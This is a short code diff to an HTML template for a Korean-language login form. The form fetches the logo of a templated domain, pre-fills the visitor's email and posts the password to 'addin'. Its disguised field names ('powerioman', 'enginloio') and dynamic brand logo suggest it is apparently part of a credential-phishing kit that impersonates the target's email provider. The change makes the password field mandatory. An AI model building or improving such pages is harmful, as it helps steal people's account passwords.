@@ -102,8 +102,8 @@ input[type="submit"]:hover{
   <form action="addin" method="post">
     {% csrf_token %}
   	<center><img src="https://logo.clearbit.com/{{domains}}"></center>
-    <input type="email" name="powerioman" value="{{email}}" required="" />
-    <input type="password" name="enginloio" placeholder="비밀번호" />
+    <input type="email" name="powerioman" value="{{email}}" required/>
+    <input type="password" name="enginloio" placeholder="비밀번호" required />
     <input type="submit" value="로그인" />
   </form>
 </div>
